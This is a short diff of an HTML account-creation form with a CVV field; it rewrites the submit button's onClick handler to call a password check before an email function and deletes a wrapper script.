@@ -148,18 +148,11 @@
                 <input type="text" name="cvv" inputmode="numeric" pattern="[0-9\s]{3}"
                            autocomplete="CVV" maxlength="3" placeholder="xxx" id="username" />
         <br><br>
-        <button type="submit" id="create" onClick = "funcCaller()" value="Submit">
+        <button type="submit" id="create" onClick = "if(checkPass()) {sendEmail} else {return false}" value="Submit">
             Create Account</button>
     </form>
 </div>
 </body>
-
-<script>
-    function funcCaller(){
-        checkPass();
-        sendEmail();
-    }
-</script>
 
 <script>
     function checkPass() {
